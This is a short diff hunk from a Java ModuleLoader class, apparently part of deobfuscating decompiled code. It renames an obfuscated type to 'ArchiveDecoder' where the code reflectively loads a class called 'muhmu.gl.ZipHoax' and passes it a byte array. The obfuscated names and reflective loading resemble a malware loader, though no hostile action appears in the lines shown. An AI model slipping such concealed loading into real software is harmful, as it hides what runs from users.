@@ -20,7 +20,7 @@ public class ModuleLoader {
         }
         try {
             byte[] byArray2;
-            kaaamma kaaamma2 = (kaaamma)Class.forName("muhmu.gl.ZipHoax").newInstance();
+            ArchiveDecoder kaaamma2 = (ArchiveDecoder)Class.forName("muhmu.gl.ZipHoax").newInstance();
             kaaamma2.aMAjaKK(byArray);
             do {
                 kaaamma2.AmAjaKK();
